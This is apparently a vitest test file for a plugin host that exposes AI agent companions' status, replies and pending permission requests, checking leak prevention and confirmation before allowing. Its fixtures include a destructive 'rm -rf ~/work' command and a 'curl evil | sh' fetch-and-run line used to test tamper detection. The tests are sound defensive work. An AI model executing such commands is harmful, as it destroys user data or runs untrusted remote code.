import { createHash } from 'node:crypto';
import { beforeEach, expect, it, vi } from 'vitest';

const mocks = vi.hoisted(() => ({
  sources: [] as Array<Record<string, unknown>>,
  activities: new Map<string, Record<string, unknown>>(),
  delegated: new Map<string, Array<Record<string, unknown>>>(),
  away: new Set<string>(),
  view: { enabled: true, selfDeviceId: 'here', actors: [] as Array<Record<string, unknown>> },
  rows: [] as Array<{ id?: string; role: string; createdAt: number; text: string | null }>,
  clearedAt: null as number | null,
}));
vi.mock('../../localDb/ipc/bots.js', () => ({ listBotRemoteResourceSources: async () => mocks.sources }));
vi.mock('../../localDb/ipc/botRemoteResourceProjection.js', () => ({
  visibleBotRemoteResourceSources: (sources: Array<{ hiddenAt: number | null }>) => sources.filter(source => source.hiddenAt === null),
}));
vi.mock('../../localDb/ipc/botRemoteResourceProvider.js', () => ({
  // The roster's own session first, then delegated tasks that are also live.
  rosterBotActivityCandidates: async (sources: Array<{ id: string }>) => new Map(sources.map(source =>
    [source.id, [mocks.activities.get(source.id), ...(mocks.delegated.get(source.id) ?? [])].filter(Boolean)])),
}));
vi.mock('../../companion-cloud/homes.js', () => ({
  companionHomes: { isHomeHere: (id: string) => !mocks.away.has(id), snapshot: () => mocks.view },
}));
// Rows newest first, read a page at a time like the database does.
vi.mock('../../companion-cloud/host.js', () => ({
  readLatestMirrorRows: async (_sessionId: string, limit: number) => mocks.rows.slice(0, limit),
  readMirrorRowsBefore: async (_sessionId: string, cursor: { createdAt: number; id?: string }, limit: number) => {
    const at = mocks.rows.findIndex(row => row.createdAt === cursor.createdAt && row.id === cursor.id);
    return mocks.rows.slice(at + 1, at + 1 + limit);
  },
}));
vi.mock('../../companion-cloud/mirror.js', () => ({ mirrorMessageText: (row: { text: string | null }) => row.text }));
vi.mock('../../agent-island/companionIdentity.js', () => ({ companionAvatarThumbnail: async () => 'SlBFRw==' }));
vi.mock('../../localDb/client/current.js', () => ({
  getCurrentDbClientSnapshot: () => ({
    client: { drizzle: { select: () => ({ from: () => ({ where: () => ({ limit: async () => [{ clearedAt: mocks.clearedAt }] }) }) }) } },
  }),
}));

import {
  createPluginCompanionHost, PLUGIN_COMPANION_CONFIRM_MAX, PLUGIN_COMPANION_MESSAGE_MAX, PLUGIN_COMPANION_REPLY_MAX, type PluginCompanionAllowPrompt, type PluginCompanionRemoteDeps,
} from '../pluginCompanionHost.js';

const source = (id: string, over: Record<string, unknown> = {}) => ({
  id, name: id.toUpperCase(), description: `${id} desc`, avatar: '', avatarColor: '', status: 'active',
  canonicalSessionId: `${id}-main`, lastMessagePreview: 'secret preview', lastMessageAt: 1, lastMessageRole: 'assistant',
  lastReplyAt: 9, needsAttention: false, hiddenAt: null, pinnedAt: null, activityAt: 1, currentVersion: 1, updatedAt: 1, ...over,
});
const pending = new Map<string, Array<{ request: unknown }>>();
const deps = (remote?: PluginCompanionRemoteDeps) => ({
  remote,
  pending: (sessionId: string) => pending.get(sessionId) ?? [],
  openSession: vi.fn(),
  flushMessages: vi.fn(async () => {}),
  resolve: vi.fn<(requestId: string, decision: Record<string, unknown>) => boolean>(() => true),
  confirmAllow: vi.fn<(prompt: PluginCompanionAllowPrompt) => Promise<boolean>>(async () => true),
});
const refOf = (sessionId: string, requestId: string) => createHash('sha256').update(`${sessionId}\n${requestId}`).digest('hex').slice(0, 32);
const answering = { ghostId: 'office', guard: () => {} };

beforeEach(() => {
  mocks.sources = [source('ada'), source('bo', { needsAttention: true }), source('gone', { hiddenAt: 1 }), source('far')];
  mocks.activities.clear();
  mocks.delegated.clear();
  mocks.activities.set('ada', {
    sessionId: 'ada-task', phase: 'needs-interaction', workingPhase: 'running-command',
    currentActionSummary: 'Running tests', startedAtMs: 1, lastActivityAtMs: 2,
  });
  mocks.away = new Set(['far']);
  mocks.view = { enabled: true, selfDeviceId: 'here', actors: [
    { externalId: 'far', name: 'Far', avatar: '🦊', homeDeviceId: 'laptop' },
    { externalId: 'ada', name: 'Ada', avatar: '', homeDeviceId: 'here' },
  ] };
  mocks.rows = [];
  mocks.clearedAt = null;
  pending.clear();
  pending.set('ada-task', [
    { request: { kind: 'permission', requestId: 'req-1', toolName: 'Bash', title: 'Run tests', input: { command: 'rm -rf ~/work' } } },
    { request: { kind: 'ask_user_question', requestId: 'req-2', questions: [{ question: 'Which branch?' }] } },
    { request: { kind: 'input_handoff', requestId: 'req-3', fields: [{ value: 'hunter2' }] } },
  ]);
});

// unit: the roster a plugin sees — visibility, status, opaque requests; unreachable homes show as offline.
it('lists local companions with status and request titles, and unreachable ones as offline', async () => {
  const d = deps();
  const companions = await createPluginCompanionHost(d).list(() => {});
  expect(companions.map(c => [c.id, c.status, c.home.isSelf])).toEqual([
    ['ada', 'awaiting', true], ['bo', 'unread', true], ['far', 'offline', false],
  ]);
  const ada = companions[0]!;
  expect(ada.activity).toEqual({ phase: 'needs-interaction', workingPhase: 'running-command', summary: 'Running tests', startedAt: 1, lastActivityAt: 2 });
  expect(ada.interactions.map(i => [i.kind, i.title])).toEqual([
    ['permission', expect.any(String)], ['question', 'Which branch?'], ['other', null],
  ]);
  for (const interaction of ada.interactions) expect(interaction.ref).toMatch(/^[0-9a-f]{32}$/);
  const serialized = JSON.stringify(companions);
  for (const leak of ['rm -rf', 'hunter2', 'req-1', 'secret preview', 'laptop']) expect(serialized).not.toContain(leak);
  expect(companions[2]).toMatchObject({ name: 'Far', description: '', interactions: [], lastReplyAt: null, home: { online: false, deviceName: null } });
});

it('opens a listed request or the companion conversation, and nothing it cannot list', async () => {
  const d = deps();
  const host = createPluginCompanionHost(d);
  const [ada] = await host.list(() => {});
  await host.open('ada', ada!.interactions[1]!.ref, () => {});
  expect(d.openSession).toHaveBeenLastCalledWith('ada-task');
  await host.open('bo', undefined, () => {});
  expect(d.openSession).toHaveBeenLastCalledWith('bo-main');
  await expect(host.open('ada', 'req-2', () => {})).rejects.toMatchObject({ code: 'TARGET_UNAVAILABLE' });
  await expect(host.open('far', undefined, () => {})).rejects.toMatchObject({ code: 'TARGET_UNAVAILABLE' });
  await expect(host.open('gone', undefined, () => {})).rejects.toMatchObject({ code: 'TARGET_UNAVAILABLE' });
  expect(d.openSession).toHaveBeenCalledTimes(2);
});

it('reads the newest visible reply after the conversation was cleared, capped in length', async () => {
  const d = deps();
  const host = createPluginCompanionHost(d);
  mocks.clearedAt = 50;
  mocks.rows = [{ role: 'user', createdAt: 90, text: 'hi' }, { role: 'assistant', createdAt: 80, text: null }, { role: 'assistant', createdAt: 40, text: 'before clear' }];
  expect(await host.reply('ada', () => {})).toBeNull();
  mocks.rows = [{ role: 'assistant', createdAt: 70, text: '好'.repeat(PLUGIN_COMPANION_REPLY_MAX + 5) }];
  const reply = await host.reply('ada', () => {});
  expect(reply).toMatchObject({ createdAt: 70, truncated: true });
  expect(Array.from(reply!.text)).toHaveLength(PLUGIN_COMPANION_REPLY_MAX);
  expect(d.flushMessages).toHaveBeenCalledTimes(2);
  await expect(host.reply('far', () => {})).rejects.toMatchObject({ code: 'TARGET_UNAVAILABLE' });
  const denied = () => { throw Object.assign(new Error('x'), { code: 'PERMISSION_DENIED' }); };
  await expect(host.reply('ada', denied)).rejects.toMatchObject({ code: 'PERMISSION_DENIED' });
});

it('returns artwork as a data URL and a glyph to draw without it', async () => {
  const host = createPluginCompanionHost(deps());
  mocks.sources = [source('ada', { avatar: 'cindy-media://blobs/abc.png' }), source('bo', { avatar: '🐼' })];
  expect(await host.avatar('ada', () => {})).toEqual({ src: 'data:image/jpeg;base64,SlBFRw==', fallback: 'A' });
  expect(await host.avatar('bo', () => {})).toEqual({ src: null, fallback: '🐼' });
  expect(await host.avatar('far', () => {})).toEqual({ src: null, fallback: '🦊' });
  await expect(host.avatar('nobody', () => {})).rejects.toMatchObject({ code: 'TARGET_UNAVAILABLE' });
});

// unit: companions whose home is another computer are read from that computer and shown like local ones.
const farOnLaptop = {
  id: 'far', name: 'Far', description: 'fox', home: { isSelf: true, online: true, deviceName: null }, status: 'awaiting',
  activity: { phase: 'needs-interaction', workingPhase: null, summary: 'Asking', startedAt: 3, lastActivityAt: 4 },
  interactions: [{ ref: 'r-far', kind: 'question', title: 'Ship it?' }], lastReplyAt: 6,
};
const laptop = (handler: (channel: string, request: Record<string, unknown>) => unknown, online = true): PluginCompanionRemoteDeps & { invoke: ReturnType<typeof vi.fn> } => ({
  devices: async () => [{ deviceId: 'laptop', name: 'Laptop', online, reachable: true }],
  invoke: vi.fn(async (_deviceId: string, channel: string, args: unknown[]) => handler(channel, args[0] as Record<string, unknown>)),
});

it('shows a companion running on another computer as that computer reports it', async () => {
  const remote = laptop((_channel, request) => request.kind === 'reply'
    ? { version: 1, reply: { text: 'Shipped.', createdAt: 9, truncated: false } }
    : { version: 1, companions: [farOnLaptop], sessions: { 'r-far': 'far-task' }, conversations: { far: 'far-main' } });
  const d = deps(remote);
  let clock = 0;
  const host = createPluginCompanionHost({ ...d, now: () => clock });
  const [, , far] = await host.list(() => {});
  expect(far).toEqual({ ...farOnLaptop, home: { isSelf: false, online: true, deviceName: 'Laptop' } });
  await host.list(() => {});
  expect(remote.invoke).toHaveBeenCalledTimes(1);
  clock = 10_000;
  await host.list(() => {});
  expect(remote.invoke).toHaveBeenCalledTimes(2);
  expect(remote.invoke).toHaveBeenLastCalledWith('laptop', 'maker:companion-live:read', [{ version: 1, kind: 'list' }]);
  await host.open('far', 'r-far', () => {});
  expect(d.openSession).toHaveBeenLastCalledWith('far-task', 'laptop');
  await host.open('far', undefined, () => {});
  expect(d.openSession).toHaveBeenLastCalledWith('far-main', 'laptop');
  await expect(host.open('far', 'r-other', () => {})).rejects.toMatchObject({ code: 'TARGET_UNAVAILABLE' });
  expect(await host.reply('far', () => {})).toEqual({ text: 'Shipped.', createdAt: 9, truncated: false });
});

it('falls back to the teammate list for an older home and to offline when it cannot be reached', async () => {
  const older = laptop((channel) => {
    if (channel === 'maker:companion-live:read') throw Object.assign(new Error('x'), { code: 'CHANNEL_NOT_ALLOWED' });
    return { collectionId: 'teammates', items: [{
      ref: { collectionId: 'teammates', kind: 'bot', id: 'far' },
      display: { title: 'Far', subtitle: 'fox', teammateActivity: { phase: 'running' }, generation: { phase: 'testing', startedAt: 2 }, timestamp: 4, lastReplyAt: 6 },
      links: [{ rel: 'conversation', target: { kind: 'session', sessionId: 'far-main' } }],
    }] };
  });
  const d = deps(older);
  const host = createPluginCompanionHost(d);
  expect((await host.list(() => {}))[2]).toEqual({
    id: 'far', name: 'Far', description: 'fox', home: { isSelf: false, online: true, deviceName: 'Laptop' }, status: 'running',
    activity: { phase: 'running', workingPhase: 'testing', summary: null, startedAt: 2, lastActivityAt: 4 }, interactions: [], lastReplyAt: 6,
  });
  expect(await host.reply('far', () => {})).toBeNull();
  await host.open('far', undefined, () => {});
  expect(d.openSession).toHaveBeenLastCalledWith('far-main', 'laptop');

  const asleep = laptop(() => { throw new Error('should not be called'); }, false);
  const offline = createPluginCompanionHost(deps(asleep));
  expect((await offline.list(() => {}))[2]).toMatchObject({ id: 'far', status: 'offline', home: { online: false, deviceName: 'Laptop' } });
  expect(asleep.invoke).not.toHaveBeenCalled();
  await expect(offline.reply('far', () => {})).rejects.toMatchObject({ code: 'TARGET_UNAVAILABLE' });

  const hidden = createPluginCompanionHost(deps(laptop(() => ({ version: 1, companions: [], sessions: {}, conversations: {} }))));
  expect((await hidden.list(() => {})).map(c => c.id)).toEqual(['ada', 'bo']);
});

it('serves only the companions running here to other computers, with the sessions open needs', async () => {
  const host = createPluginCompanionHost(deps());
  const served = await host.serveRemote({ version: 1, kind: 'list' }) as { companions: Array<{ id: string; interactions: Array<{ ref: string }> }>; sessions: Record<string, string>; conversations: Record<string, string> };
  expect(served.companions.map(c => c.id)).toEqual(['ada', 'bo']);
  expect(served.sessions[served.companions[0]!.interactions[0]!.ref]).toBe('ada-task');
  expect(served.conversations).toEqual({ ada: 'ada-main', bo: 'bo-main' });
  await expect(host.serveRemote({ version: 2, kind: 'list' })).rejects.toMatchObject({ code: 'INVALID_PARAMS' });
  await expect(host.serveRemote({ version: 1, kind: 'send', companionId: 'ada' })).rejects.toMatchObject({ code: 'INVALID_PARAMS' });
});

// unit: answering in the plugin's page — what it may see, what it may settle, and Cindy's own confirmation for allowing.
it('shows a pending request the way its card does, and Cindy\'s own confirmations only as other', async () => {
  pending.get('ada-task')!.push(
    { request: { kind: 'permission', requestId: 'req-4', toolName: 'mcp__cindy__ghost_forge_install', input: {}, metadata: { hostOwnedConfirmation: 'plugin_install' } } },
    { request: { kind: 'plan_review', requestId: 'req-5', plan: '1. Write tests\n2. Ship' } },
    { request: { kind: 'ask_user_question', requestId: 'req-6', questions: [{ question: 'Which?', header: 'Pick', multiSelect: true, options: [{ label: 'A', description: 'first' }, { label: 'B' }] }] } },
  );
  const host = createPluginCompanionHost(deps());
  const [ada] = await host.list(() => {});
  expect(ada!.interactions.map(i => i.kind)).toEqual(['permission', 'question', 'other', 'other', 'plan', 'question']);
  const [permission, , handoff, install, plan, multi] = ada!.interactions;
  expect(await host.interaction('ada', permission!.ref, () => {}))
    .toEqual({ ref: permission!.ref, kind: 'permission', action: 'command', tool: 'Run tests', subject: null, preview: 'rm -rf ~/work', allowHere: true });
  expect(await host.interaction('ada', plan!.ref, () => {})).toEqual({ ref: plan!.ref, kind: 'plan', plan: '1. Write tests\n2. Ship', truncated: false, allowHere: true });
  expect(await host.interaction('ada', multi!.ref, () => {})).toEqual({ ref: multi!.ref, kind: 'question', questions: [{
    question: 'Which?', header: 'Pick', multiSelect: true, options: [{ label: 'A', description: 'first' }, { label: 'B', description: null }],
  }] });
  expect(await host.interaction('ada', install!.ref, () => {})).toMatchObject({ kind: 'other' });
  expect(JSON.stringify(await host.interaction('ada', handoff!.ref, () => {}))).not.toContain('hunter2');
  await expect(host.interaction('ada', 'req-1', () => {})).rejects.toMatchObject({ code: 'TARGET_UNAVAILABLE' });
  await expect(host.interaction('bo', permission!.ref, () => {})).rejects.toMatchObject({ code: 'TARGET_UNAVAILABLE' });
  // Not answerable from a plugin at all.
  await expect(host.answer('ada', install!.ref, { kind: 'permission', decision: 'deny' }, answering)).rejects.toMatchObject({ code: 'INVALID_PARAMS' });
});

it('answers questions and declines or comments directly, the way Cindy\'s cards encode them', async () => {
  pending.get('ada-task')!.push(
    { request: { kind: 'ask_user_question', requestId: 'req-6', questions: [{ question: 'Which?', multiSelect: true, options: [{ label: 'A' }, { label: 'B' }] }, { question: 'One?', options: [{ label: 'X' }, { label: 'Y' }] }] } },
    { request: { kind: 'plan_review', requestId: 'req-5', plan: 'Plan' } },
  );
  const d = deps();
  const host = createPluginCompanionHost(d);
  const refs = (await host.list(() => {}))[0]!.interactions.map(i => i.ref);
  expect(await host.answer('ada', refs[1]!, { kind: 'question', answers: [{ choices: [], text: ' main ' }] }, answering)).toEqual({ answered: true });
  expect(d.resolve).toHaveBeenLastCalledWith('req-2', { kind: 'ask_user_question', answers: { 'Which branch?': 'main' } });
  await host.answer('ada', refs[3]!, { kind: 'question', answers: [{ choices: ['B', 'A'], text: 'and C' }, { choices: ['Y'] }] }, answering);
  expect(d.resolve).toHaveBeenLastCalledWith('req-6', { kind: 'ask_user_question', answers: { 'Which?': '["A","B","and C"]', 'One?': 'Y' } });
  await host.answer('ada', refs[0]!, { kind: 'permission', decision: 'deny' }, answering);
  expect(d.resolve).toHaveBeenLastCalledWith('req-1', { kind: 'permission', behavior: 'deny' });
  await host.answer('ada', refs[4]!, { kind: 'plan', decision: 'deny', feedback: ' Smaller steps ' }, answering);
  expect(d.resolve).toHaveBeenLastCalledWith('req-5', { kind: 'plan_review', behavior: 'deny', reason: 'Smaller steps' });
  expect(d.confirmAllow).not.toHaveBeenCalled();
  const calls = d.resolve.mock.calls.length;
  for (const wrong of [
    { kind: 'question' as const, answers: [{ choices: ['Z'] }, { choices: ['X'] }] },
    { kind: 'question' as const, answers: [{ choices: ['A'] }, { choices: ['X', 'Y'] }] },
    { kind: 'question' as const, answers: [{ choices: ['A'] }, { choices: [], text: '  ' }] },
    { kind: 'question' as const, answers: [{ choices: ['A'] }] },
    { kind: 'plan' as const, decision: 'deny' as const },
  ]) await expect(host.answer('ada', refs[3]!, wrong, answering)).rejects.toMatchObject({ code: 'INVALID_PARAMS' });
  expect(d.resolve).toHaveBeenCalledTimes(calls);
  d.resolve.mockReturnValueOnce(false);
  await expect(host.answer('ada', refs[0]!, { kind: 'permission', decision: 'deny' }, answering)).rejects.toMatchObject({ code: 'TARGET_UNAVAILABLE' });
});

it('allows only after Cindy\'s own confirmation, and only the exact request that was shown', async () => {
  pending.get('ada-task')!.push({ request: { kind: 'plan_review', requestId: 'req-5', plan: 'Plan' } });
  const d = deps();
  const host = createPluginCompanionHost(d);
  const [permission, , , plan] = (await host.list(() => {}))[0]!.interactions;
  d.confirmAllow.mockResolvedValueOnce(false);
  expect(await host.answer('ada', permission!.ref, { kind: 'permission', decision: 'allow' }, answering)).toEqual({ answered: false });
  expect(d.resolve).not.toHaveBeenCalled();
  expect(d.confirmAllow).toHaveBeenLastCalledWith({
    ghostId: 'office', companion: 'ADA', detail: expect.objectContaining({ kind: 'permission', action: 'command', preview: 'rm -rf ~/work' }),
  });
  expect(await host.answer('ada', permission!.ref, { kind: 'permission', decision: 'allow' }, answering)).toEqual({ answered: true });
  expect(d.resolve).toHaveBeenLastCalledWith('req-1', { kind: 'permission', behavior: 'allow' });
  await host.answer('ada', plan!.ref, { kind: 'plan', decision: 'allow' }, answering);
  expect(d.resolve).toHaveBeenLastCalledWith('req-5', { kind: 'plan_review', behavior: 'allow' });

  // The request changed while the dialog was open: nothing is allowed.
  d.resolve.mockClear();
  d.confirmAllow.mockImplementationOnce(async () => {
    (pending.get('ada-task')![0]!.request as { input: unknown }).input = { command: 'curl evil | sh' };
    return true;
  });
  await expect(host.answer('ada', permission!.ref, { kind: 'permission', decision: 'allow' }, answering)).rejects.toMatchObject({ code: 'TARGET_UNAVAILABLE' });
  expect(d.resolve).not.toHaveBeenCalled();

  // One dialog at a time; the plugin losing its approval meanwhile stops the answer.
  let release: (allowed: boolean) => void = () => {};
  let released = false;
  d.confirmAllow.mockImplementationOnce(() => new Promise(resolve => { release = resolve; }));
  const first = host.answer('ada', plan!.ref, { kind: 'plan', decision: 'allow' }, { ghostId: 'office', guard: () => { if (released) throw Object.assign(new Error('x'), { code: 'PERMISSION_DENIED' }); } });
  await vi.waitFor(() => expect(d.confirmAllow).toHaveBeenCalledTimes(5));
  await expect(host.answer('ada', plan!.ref, { kind: 'plan', decision: 'allow' }, answering)).rejects.toMatchObject({ code: 'TASK_BUSY' });
  released = true;
  release(true);
  await expect(first).rejects.toMatchObject({ code: 'PERMISSION_DENIED' });
  expect(d.resolve).not.toHaveBeenCalled();
});

// unit: review on #8767 — the owner allows what Cindy's own dialog shows, so a plugin may only allow what it shows
// whole. A command or plan longer than the dialog, a file write (where, not what) or arguments the summary cuts are
// allowed in Cindy; declining needs no dialog.
it('lets a plugin allow only what Cindy\'s own dialog can show whole', async () => {
  pending.set('ada-task', [
    { request: { kind: 'permission', requestId: 'r-long', toolName: 'Bash', input: { command: `echo ok ${'x'.repeat(PLUGIN_COMPANION_CONFIRM_MAX)} && rm -rf ~/work` } } },
    { request: { kind: 'permission', requestId: 'r-write', toolName: 'Write', input: { file_path: '/tmp/notes.md', content: 'anything' } } },
    { request: { kind: 'permission', requestId: 'r-args', toolName: 'mcp__srv__run', input: { script: 'y'.repeat(600) } } },
    { request: { kind: 'permission', requestId: 'r-short', toolName: 'mcp__srv__run', input: { script: 'ls' } } },
    { request: { kind: 'plan_review', requestId: 'r-plan', plan: 'p'.repeat(PLUGIN_COMPANION_CONFIRM_MAX + 1) } },
  ]);
  const d = deps();
  const host = createPluginCompanionHost(d);
  const refs = (await host.list(() => {}))[0]!.interactions.map(i => i.ref);
  const shown = await Promise.all(refs.map(async ref => (await host.interaction('ada', ref, () => {}) as { allowHere?: boolean }).allowHere));
  expect(shown).toEqual([false, false, false, true, false]);
  for (const [ref, answer] of [[refs[0], { kind: 'permission', decision: 'allow' }], [refs[1], { kind: 'permission', decision: 'allow' }],
    [refs[2], { kind: 'permission', decision: 'allow' }], [refs[4], { kind: 'plan', decision: 'allow' }]] as const) {
    await expect(host.answer('ada', ref!, answer, answering)).rejects.toMatchObject({ code: 'ALLOW_IN_CINDY' });
  }
  expect(d.confirmAllow).not.toHaveBeenCalled();
  expect(d.resolve).not.toHaveBeenCalled();
  expect(await host.answer('ada', refs[0]!, { kind: 'permission', decision: 'deny' }, answering)).toEqual({ answered: true });
  expect(d.resolve).toHaveBeenLastCalledWith('r-long', { kind: 'permission', behavior: 'deny' });
  expect(await host.answer('ada', refs[3]!, { kind: 'permission', decision: 'allow' }, answering)).toEqual({ answered: true });
  expect(d.confirmAllow).toHaveBeenCalledOnce();
  expect(d.resolve).toHaveBeenLastCalledWith('r-short', { kind: 'permission', behavior: 'allow' });
});

// unit: review on #8767 — a companion's main conversation and a delegated task can both wait on the owner; the
// status follows the session the roster shows, the requests come from both and each stays answerable and openable.
it('lists the requests of every task waiting on the owner, not only the one the roster shows', async () => {
  mocks.delegated.set('ada', [{ sessionId: 'ada-side', phase: 'needs-interaction', workingPhase: null, currentActionSummary: null, startedAtMs: 3, lastActivityAtMs: 4 }]);
  pending.set('ada-side', [{ request: { kind: 'ask_user_question', requestId: 'req-9', questions: [{ question: 'Deploy now?' }] } }]);
  const d = deps();
  const host = createPluginCompanionHost(d);
  const [ada] = await host.list(() => {});
  expect(ada!.activity.summary).toBe('Running tests');
  expect(ada!.interactions).toHaveLength(4);
  const side = ada!.interactions[3]!;
  expect(side).toMatchObject({ kind: 'question', title: 'Deploy now?' });
  expect(await host.interaction('ada', side.ref, () => {})).toMatchObject({ kind: 'question', questions: [{ question: 'Deploy now?' }] });
  expect(await host.answer('ada', side.ref, { kind: 'question', answers: [{ choices: [], text: 'yes' }] }, answering)).toEqual({ answered: true });
  expect(d.resolve).toHaveBeenLastCalledWith('req-9', { kind: 'ask_user_question', answers: { 'Deploy now?': 'yes' } });
  await host.open('ada', side.ref, () => {});
  expect(d.openSession).toHaveBeenLastCalledWith('ada-side');
});

// unit: review on #8767 — a long turn leaves many rows the chat hides (tool steps, progress notes, sub-agents) after
// the last reply; reply and history read back past them a page at a time instead of stopping at a fixed window.
it('finds the latest reply and the recent conversation past a long run of hidden rows', async () => {
  const hidden = Array.from({ length: 250 }, (_, i) => ({ id: `h${i}`, role: 'assistant', createdAt: 1000 - i, text: null }));
  mocks.rows = [...hidden, { id: 'a1', role: 'assistant', createdAt: 700, text: 'Done: 3 files' },
    { id: 'u1', role: 'user', createdAt: 690, text: 'Fix it' }, { id: 'u0', role: 'user', createdAt: 600, text: 'Earlier' }];
  const host = createPluginCompanionHost(deps());
  expect(await host.reply('ada', () => {})).toEqual({ text: 'Done: 3 files', createdAt: 700, truncated: false });
  expect(await host.history('ada', 2, () => {})).toEqual({ messages: [
    { role: 'user', text: 'Fix it', createdAt: 690, truncated: false },
    { role: 'assistant', text: 'Done: 3 files', createdAt: 700, truncated: false },
  ], more: true });
  expect(await host.history('ada', 3, () => {})).toMatchObject({ more: false });
});

it('answers a companion on another computer through that computer\'s own resolve channel', async () => {
  const ref = refOf('far-task', 'req-far');
  const remote = {
    ...laptop((channel, request) => {
      if (channel === 'maker:get-pending-interactions') return [{ request: { kind: 'ask_user_question', requestId: 'req-far', questions: [{ question: 'Ship it?', options: [{ label: 'Yes' }, { label: 'No' }] }] } }];
      return request && { version: 1, companions: [{ ...farOnLaptop, interactions: [{ ref, kind: 'question', title: 'Ship it?' }] }], sessions: { [ref]: 'far-task' }, conversations: {} };
    }),
    write: vi.fn(async () => ({ accepted: true })),
  };
  const d = deps(remote);
  const host = createPluginCompanionHost(d);
  expect(await host.interaction('far', ref, () => {})).toMatchObject({ kind: 'question', questions: [{ question: 'Ship it?' }] });
  expect(remote.invoke).toHaveBeenCalledWith('laptop', 'maker:get-pending-interactions', ['far-task']);
  expect(await host.answer('far', ref, { kind: 'question', answers: [{ choices: ['Yes'] }] }, answering)).toEqual({ answered: true });
  expect(remote.write).toHaveBeenCalledWith('laptop', 'maker:resolve-interaction', ['req-far', { kind: 'ask_user_question', answers: { 'Ship it?': 'Yes' } }]);
  expect(d.resolve).not.toHaveBeenCalled();
  remote.write.mockResolvedValueOnce({ accepted: false });
  await expect(host.answer('far', ref, { kind: 'question', answers: [{ choices: ['No'] }] }, answering)).rejects.toMatchObject({ code: 'TARGET_UNAVAILABLE' });
  await expect(host.answer('far', 'r-unknown', { kind: 'question', answers: [{ choices: ['No'] }] }, answering)).rejects.toMatchObject({ code: 'TARGET_UNAVAILABLE' });
});

// unit: the recent conversation — what the chat shows (the mirror's projection), oldest first, capped.
it('reads the latest messages of the main conversation, oldest first, without what the chat hides', async () => {
  const d = deps();
  const host = createPluginCompanionHost(d);
  mocks.clearedAt = 10;
  mocks.rows = [ // newest first, as readLatestMirrorRows returns them
    { role: 'assistant', createdAt: 60, text: 'Done: 3 bugs fixed.' },
    { role: 'assistant', createdAt: 55, text: null }, // progress note / tool step: not in the chat
    { role: 'user', createdAt: 50, text: 'Fix the login bugs' },
    { role: 'assistant', createdAt: 40, text: '好'.repeat(PLUGIN_COMPANION_MESSAGE_MAX + 3) },
    { role: 'user', createdAt: 30, text: 'Hi' },
    { role: 'assistant', createdAt: 5, text: 'before the conversation was cleared' },
  ];
  const all = await host.history('ada', 20, () => {});
  expect(all!.more).toBe(false);
  expect(all!.messages.map(m => [m.role, m.createdAt, m.truncated])).toEqual([
    ['user', 30, false], ['assistant', 40, true], ['user', 50, false], ['assistant', 60, false],
  ]);
  expect(Array.from(all!.messages[1]!.text)).toHaveLength(PLUGIN_COMPANION_MESSAGE_MAX);
  expect(JSON.stringify(all)).not.toContain('before the conversation');
  const last = await host.history('ada', 2, () => {});
  expect(last).toEqual({ more: true, messages: [
    { role: 'user', text: 'Fix the login bugs', createdAt: 50, truncated: false },
    { role: 'assistant', text: 'Done: 3 bugs fixed.', createdAt: 60, truncated: false },
  ] });
  expect(d.flushMessages).toHaveBeenCalled();
  await expect(host.history('gone', 20, () => {})).rejects.toMatchObject({ code: 'TARGET_UNAVAILABLE' });
  const denied = () => { throw Object.assign(new Error('x'), { code: 'PERMISSION_DENIED' }); };
  await expect(host.history('ada', 20, denied)).rejects.toMatchObject({ code: 'PERMISSION_DENIED' });
  // and the same view for another computer of the account
  expect(await host.serveRemote({ version: 1, kind: 'history', companionId: 'ada', limit: 2 })).toEqual({ version: 1, history: last });
});

it('reads the conversation of a companion on another computer from there, and nothing from an older home', async () => {
  const remote = laptop((_channel, request) => request.kind === 'history'
    ? { version: 1, history: { more: true, messages: [{ role: 'user', text: 'Ship it', createdAt: 1 }, { role: 'tool', text: 'x', createdAt: 2 }, { role: 'assistant', text: 'Shipped.', createdAt: 3 }] } }
    : { version: 1, companions: [farOnLaptop], sessions: {}, conversations: {} });
  const host = createPluginCompanionHost(deps(remote));
  expect(await host.history('far', 20, () => {})).toEqual({ more: true, messages: [
    { role: 'user', text: 'Ship it', createdAt: 1, truncated: false }, { role: 'assistant', text: 'Shipped.', createdAt: 3, truncated: false },
  ] });
  expect(remote.invoke).toHaveBeenLastCalledWith('laptop', 'maker:companion-live:read', [{ version: 1, kind: 'history', companionId: 'far', limit: 20 }]);
  const older = createPluginCompanionHost(deps(laptop(() => { throw Object.assign(new Error('x'), { code: 'INVALID_PARAMS' }); })));
  expect(await older.history('far', 20, () => {})).toBeNull();
});
